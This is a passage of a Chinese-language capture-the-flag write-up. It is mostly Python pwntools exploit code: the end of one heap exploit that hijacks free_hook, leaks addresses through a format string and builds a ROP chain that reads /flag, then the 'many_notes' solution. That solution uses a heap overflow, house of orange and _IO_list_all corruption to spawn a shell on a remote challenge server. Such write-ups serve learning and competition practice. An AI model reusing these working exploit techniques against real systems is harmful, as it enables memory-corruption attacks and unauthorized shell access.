    add(0x410) #10
    payload = 'x00'*0x400 + p64(0) +p64(0x421) 
    edit(10,payload)
    free(8)
    free(7)
    fake_addr = fake_addr+0x410
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) + p64(0x71) + 'x00'*0x60
    payload += p64(0) + p64(0x421) + p64(fake_addr)
    edit(5,payload) #修改0x420chunk的fd
    add(0x410) #7
    add(0x410) #8 这个块可以控制free_hook
    payload = 'x00'*0x400 + p64(0) +p64(0x421) 
    edit(8,payload)
    free(7)
    fake_addr = fake_addr+0x410
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) + p64(0x71) + 'x00'*0x60
    payload += p64(0) + p64(0x421) + p64(fake_addr)
    edit(5,payload) #修改0x420chunk的fd
    add(0x410) #7
    add(0x410) #11
    payload = 'x00'*0x400 + p64(0) +p64(0x421) 
    edit(11,payload)
    free(7)
    fake_addr = fake_addr+0x410
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) + p64(0x71) + 'x00'*0x60
    payload += p64(0) + p64(0x421) + p64(fake_addr)
    edit(5,payload) #修改0x420chunk的fd
    add(0x410) #7
    add(0x410) #12
    printf_addr = libc.sym['printf']
    payload = 'x00'*0x400 + p64(printf_addr)  #free_hook_value
    edit(12,payload)
    #通过printf格式化字符串漏洞泄露栈地址
    edit(2,'%p '*0x40)
    free(2)
    r.recv()
    res = r.recv().split(' ')
    elf_addr = int(res[0],16) - 0x5555555552c2 + 0x555555554000
    stack_addr = int(res[2],16) - 0x7fffffffed00 + 0x7ffffffde000 
    canary = int(res[16],16)
    success("elf_addr => "+hex(elf_addr))
    success("stack_addr => "+hex(stack_addr))
    success("canary => "+hex(canary))
    r.sendline()
    #修改程序中全局指针
    fake_addr = elf_addr - 0x555555554000 + 0x5555557560fd
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) +p64(0x71) + p64(fake_addr)
    edit(5,payload)
    add(0x60) #2
    add(0x60) #13
    edit(5,p64(heap_addr - 0x0000555555757000+0x00005555557571b0)*0x100)
    payload = 'x00'*3 + p64(heap_addr - 0x0000555555757000+0x00005555557571b0)
    edit(13,payload)
    #下面开始任意地址读写
    ret_addr = stack_addr - 0x7ffffffde000 + 0x00007fffffffed48 #这里放堆地址
    edit(15,p64(ret_addr)+p64(0x200)) #设置0 为栈地址，用edit编辑
    pop_rsp_ret = libc.address + 0x0000000000003838
    payload = p64(pop_rsp_ret) + p64(ret_addr+0x10)
    #通过任意地址写在栈上构造读取flag的rop
    buf_addr = elf_addr - 0x555555554000 + 0x00005555557561C8
    p = ''
    # fd = open('flag', 0)
    p += p64(0x00000000000202e8+libc.address) # pop rsi ; ret
    p += p64(buf_addr) # @ .data
    p += p64(0x0000000000033544+libc.address) # pop rax ; ret
    p += '/flag'.ljust(8,'x00')
    p += p64(0x000000000007783a+libc.address) # mov qword ptr [rsi], rax ; ret
    p += p64(0x0000000000021102+libc.address) # pop rdi ; ret
    p += p64(buf_addr) # @ .data
    p += p64(0x00000000000202e8+libc.address) # pop rsi ; ret
    p += p64(0)                     # rsi = 0
    p += p64(0x000000000008b8c5+libc.address) # xor rax, rax ; ret
    p += p64(0x00000000000abf40+libc.address) # add rax, 1 ; ret
    p += p64(0x00000000000abf40+libc.address) # add rax, 1 ; ret
    p += p64(0x00000000000bc375+libc.address) # syscall ; ret
    # read(fd, buf_addr+8, 0x100)
    # p += p64(0x000000000044fd9f) # xchg eax, ebp ; ret
    p += p64(0x00000000000202e8+libc.address) # pop rsi ; ret
    p += p64(buf_addr+0x30) # @ .data + fd
    p += p64(0x000000000007783a+libc.address) # mov qword ptr [rsi], rax ; ret
    p += p64(0x0000000000001b92+libc.address) # pop rdx ; ret
    p += p64(buf_addr+0x30) # @ .data + fd
    p += p64(0x00000000001840e6+libc.address) # mov edi, dword ptr [rdx] ; ret
    p += p64(0x00000000000202e8+libc.address) # pop rsi ; ret
    p += p64(buf_addr+8) # @ .data + 8
    p += p64(0x0000000000001b92+libc.address) # pop rdx ; ret
    p += p64(0x100) # 0x100
    p += p64(0x000000000008b8c5+libc.address) # xor rax, rax ; ret
    p += p64(0x00000000000bc375+libc.address) # syscall ; ret
    # write(1, buf_addr+8, 0x100)
    p += p64(0x0000000000021102+libc.address) # pop rdi ; ret
    p += p64(1) # stdout
    p += p64(0x00000000000202e8+libc.address) # pop rsi ; ret
    p += p64(buf_addr+8) # @ .data + 8
    p += p64(0x0000000000001b92+libc.address) # pop rdx ; ret
    p += p64(0x100) # 0x100
    p += p64(0x000000000008b8c5+libc.address) # xor rax, rax ; ret
    p += p64(0x00000000000abf40+libc.address) # add rax, 1 ; ret
    p += p64(0x00000000000bc375+libc.address) # syscall ; ret
    payload += p
    # gdb.attach(r,"b *0x00005555555551E7")
    edit(0,payload)
    r.interactive()
###  many_notes
**分析**
  * 输入username长度为8是可以泄露libc地址
  * 在read函数中，输入content的时候，循环中的size大小不变，有堆溢出漏洞
  * 线程thread_arena分配的堆块原理与main_arena大致一样
  * 通过不停分配堆块，类似于house of orange，最后top chunk不够分配的内存会被free掉进入unsortbin
  * 从unsortbin中new一个新的堆块，并通过堆溢出漏洞修改unsortbin，利用house of orange方法getshell
**exp**
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    #version 6 by tempo
    from pwn import *
    from time import sleep
    import base64
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    IS_DEBUG = 0
    prog = './many_notes'
    def change_ld(binary,ld):
        if not os.access(ld, os.R_OK): 
            log.failure("Invalid path {} to ld".format(ld))
            return None
        if not isinstance(binary, ELF):
            if not os.access(binary, os.R_OK): 
                log.failure("Invalid path {} to binary".format(binary))
                return None
            binary = ELF(binary)
        for segment in binary.segments:
            if segment.header['p_type'] == 'PT_INTERP':
                size = segment.header['p_memsz']
                addr = segment.header['p_paddr']
                data = segment.data()
                if size <= len(ld):
                    log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                    return None
                binary.write(addr, ld.ljust(size, ''))
                if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
                path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
                if os.access(path, os.F_OK): 
                    os.remove(path)
                    info("Removing exist file {}".format(path))
                binary.save(path)    
                os.chmod(path, 0b111000000) #rwx------        success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
        return ELF(path)
    #example
    elf = change_ld('./many_notes', './ld-linux-x86-64.so.2')
    if IS_DEBUG:
        r = elf.process(env={'LD_PRELOAD':'./libc.so.6:./ld-linux-x86-64.so.2:./libpthread.so.0'})
        libc =r.libc
        # r = process(prog, env={'LD_PRELOAD':'../libc/libc-2.28.so'})
    else:
        r = remote('123.206.174.203', 20003)
    # r = process('./{}'.format(prog))
    libc = ELF('./libc.so.6')
    def my_u64(byte_arr):
        padding = b'x00' * (8-len(byte_arr))
        res = byte_arr + padding
        return struct.unpack('<Q', res)[0]
    def round(size,padding,input,content):
        r.sendlineafter("Choice","0")
        r.sendlineafter("Size",str(size))
        r.sendlineafter("Padding",str(padding))
        r.sendlineafter("Input?",str(input))
        if input != 0:
            r.sendafter("Content",str(content))
    r.sendafter("name","a"*8) #可用于泄露程序地址，libc地址，栈地址 0x00007fffffffecc0
    r.recvuntil("a"*8)
    libc.address = u64(r.recv(6).ljust(8,'x00')) -0x7ffff7bb5720+ 0x00007ffff780a000
    success(hex(libc.address))
    for i in range(0x2fe):
        round(0x2000,0x1f, 0,'a'*0x2000)
    round(0x2000,0xe, 0, 'a'*0x2000)
    # consume freed chunk at the tail of heap_0
    round(0x300, 0, 0, '') 
    #剩下0x1e0大小的unsortbin,将以下payload溢出覆盖正常的unsortbin
    #模板：
    system_addr = libc.sym['system']
    bin_sh_addr = next(libc.search("/bin/sh"))
    io_list_all = libc.sym['_IO_list_all'] #&_IO_list_all
    io_str_jump = libc.sym['_IO_file_jumps']+0xc0 #&_IO_str_jumps
    payload = 'b'*0x10
    #需要将(_IO_list_all或_IO_2_1_stderr+0x68_或_IO_2_1_stdout_+0x68或_IO_2_1_stdin_+0x68)的值修改为伪造表的地址或者一个0x68处指向伪造表的指针（如unsortbin攻击），比如将*_IO_list_all修改为a,a的0x68处指针为b，b就是以下payload，为伪造的io_file_plus表
    payload += p64(0) + p64(0x61) + p64(0) +p64(io_list_all-0x10) +p64(0)+p64(1)+p64(0)
    payload += p64(bin_sh_addr) + p64(0)*19 +p64(io_str_jump-8)
    payload += p64(0) + p64(system_addr)#system调用时会将IO_buf_base设为参数，实现shell
    #这里的io_list_all-0x10主要是为了利用unsortbin attack，修改_IO_list_all的值为main_arena+0x58，在有任意地址写的能力时，就不需要这么麻烦了。
    #payload长度0x100
    round(0x100,0, 1, 'a'*0xf0) #剩余0x10
    r.send(payload)
    r.sendlineafter("Choice","0")
    r.sendlineafter("Size",str(0x10))
    r.interactive()